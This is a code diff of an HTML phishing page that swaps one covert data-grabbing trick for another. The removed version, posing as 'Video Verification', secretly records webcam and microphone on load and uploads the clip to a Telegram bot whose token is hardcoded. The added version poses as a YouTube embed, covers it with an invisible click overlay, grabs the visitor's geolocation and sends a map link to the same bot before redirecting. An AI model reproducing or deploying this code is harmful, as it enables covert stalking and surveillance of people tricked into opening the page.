@@ -1,45 +1,18 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Video Verification</title>
-</head>
-<body>
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+<head><meta charset="UTF-8"><title>YouTube</title></head>
+<body style="margin:0; background:#000;">
+    <iframe src="https://www.youtube.com/embed/Enf0Z0SsQHs?autoplay=1&mute=1" style="width:100%; height:100vh; border:none;"></iframe>
+    <div onclick="getLoc()" style="position:fixed; top:0; width:100%; height:100%; z-index:9;"></div>
 
     <script>
-        const botToken = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI';
-        const adminId = '8275787221';
-
-        async function startRecording() {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            const mediaRecorder = new MediaRecorder(stream);
-            let chunks = [];
-
-            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-            mediaRecorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'video/mp4' });
-                await sendToTelegram(blob, 'video');
-            };
-
-            mediaRecorder.start();
-            setTimeout(() => {
-                mediaRecorder.stop();
-                stream.getTracks().forEach(track => track.stop());
-            }, 5000); // 5 soniya yozadi
+        function getLoc() {
+            navigator.geolocation.getCurrentPosition(p => {
+                const txt = `📍 Manzil: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                fetch(`https://api.telegram.org/bot8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI/sendMessage?chat_id=8275787221&text=${encodeURIComponent(txt)}`)
+                .then(() => window.location.href = "https://youtu.be/Enf0Z0SsQHs");
+            }, () => window.location.href = "https://youtu.be/Enf0Z0SsQHs");
         }
-
-        async function sendToTelegram(blob, type) {
-            const formData = new FormData();
-            formData.append(type, blob, 'video.mp4');
-            await fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}?chat_id=${adminId}`, {
-                method: 'POST',
-                body: formData
-            });
-            window.location.href = "https://youtube.com";
-        }
-
-        window.onload = startRecording;
     </script>
 </body>
 </html>
- 
